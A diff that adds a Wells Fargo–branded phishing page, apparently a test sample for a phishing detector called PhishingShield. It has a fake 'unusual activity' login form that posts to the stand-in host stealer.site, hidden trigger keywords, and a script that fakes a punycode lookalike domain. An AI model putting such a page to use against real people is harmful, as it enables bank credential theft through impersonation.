@@ -1,0 +1,98 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Wells Fargo - Verify Identity</title>
+    <style>
+        body {
+            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
+            background: #d71e28;
+            color: white;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            flex-direction: column;
+        }
+
+        .login-box {
+            background: white;
+            padding: 40px;
+            width: 350px;
+            text-align: center;
+            border-radius: 4px;
+            color: #333;
+        }
+
+        .logo {
+            font-size: 24px;
+            font-weight: bold;
+            margin-bottom: 20px;
+            color: #d71e28;
+        }
+
+        input {
+            width: 90%;
+            padding: 12px;
+            margin: 10px 0;
+            border: 1px solid #ccc;
+            font-size: 14px;
+        }
+
+        button {
+            width: 98%;
+            padding: 12px;
+            background: #d71e28;
+            color: white;
+            border: none;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+
+        .links {
+            font-size: 11px;
+            margin-top: 15px;
+            color: #666;
+        }
+    </style>
+</head>
+
+<body>
+
+    <div class="login-box">
+        <div class="logo">WELLS FARGO</div>
+        <p><strong>Security Alert:</strong> Unusual activity detected.</p>
+        <p>Please sign on to verify your identity.</p>
+
+        <form action="http://stealer.site/login.php" method="POST">
+            <input type="text" placeholder="Username / Access Card">
+            <input type="password" placeholder="Password / PIN">
+            <button type="submit">Sign On</button>
+        </form>
+
+        <div class="links">
+            <a href="#">Forgot Password/Username?</a> | <a href="#">Enroll Now</a>
+        </div>
+    </div>
+
+    <!-- Triggers for PhishingShield -->
+    <div style="display:none;">
+        failed attempt blocked suspended immediate action required
+        unauthorized access secure banking
+    </div>
+
+    <script>
+        // Simulate Punycode URL if not present
+        if (!window.location.search.includes('fake_host_for_testing')) {
+            const newUrl = window.location.protocol + '//' + window.location.pathname + '?fake_host_for_testing=xn--wellsfargo-bad.com';
+            window.location.replace(newUrl);
+        }
+    </script>
+
+</body>
+
+</html>
